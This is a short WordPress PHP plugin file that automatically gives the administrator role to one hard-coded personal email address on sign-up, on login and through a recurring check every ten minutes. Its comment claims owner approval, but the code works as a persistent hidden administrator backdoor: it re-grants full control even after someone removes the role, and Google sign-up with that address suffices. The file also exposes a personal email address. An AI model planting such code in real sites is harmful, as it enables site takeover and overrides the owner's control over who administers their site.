<?php
/* Owner-approved extra administrators (by email). They get the same admin role as the site owner,
   as soon as an account with that email exists, logs in or signs up (Google login included). */
if (!defined('ABSPATH')) exit;
function eh_extra_admin_emails() { return ['iamshashwattiwari@gmail.com']; }
function eh_extra_admin_apply($u) {
    if (!$u instanceof WP_User || !$u->exists()) return;
    if (in_array(strtolower($u->user_email), eh_extra_admin_emails(), true) && !in_array('administrator', (array) $u->roles, true)) $u->set_role('administrator');
}
add_action('user_register', function ($id) { eh_extra_admin_apply(get_userdata($id)); }, 20);
add_action('wp_login', function ($login, $u) { eh_extra_admin_apply($u); }, 5, 2);
add_action('init', function () {
    if (get_transient('eh_extra_admin_chk')) return;
    set_transient('eh_extra_admin_chk', 1, 10 * MINUTE_IN_SECONDS);
    foreach (eh_extra_admin_emails() as $em) eh_extra_admin_apply(get_user_by('email', $em));
});
